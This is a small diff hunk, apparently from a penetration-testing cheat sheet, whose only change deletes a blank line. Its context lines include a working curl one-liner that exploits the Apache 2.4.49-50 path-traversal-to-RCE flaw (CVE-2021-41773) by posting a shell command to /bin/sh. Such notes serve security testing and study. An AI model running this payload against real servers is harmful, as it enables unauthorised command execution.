@@ -7,7 +7,6 @@
   - Doesn't seem to work for Python requests module - use curl or burp instead
   - Seems to only work for intranet
 
-
 * Apache 2.4.49-50 LFI2RCE (CVE-2021-41773)
 
   `curl 'http://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo; ls'`
